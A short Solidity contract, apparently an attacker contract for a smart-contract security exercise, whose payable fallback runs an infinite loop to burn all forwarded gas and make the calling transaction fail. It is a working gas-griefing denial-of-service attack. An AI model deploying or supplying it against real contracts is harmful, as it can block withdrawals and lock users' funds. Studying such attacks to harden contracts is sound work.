// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract denial {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

// with a infinite loop you can consume all the gas related to the transaction and abort the execution
    fallback() payable external{
        require(gasleft() > 500000);
        while (true) {
        }
    }
}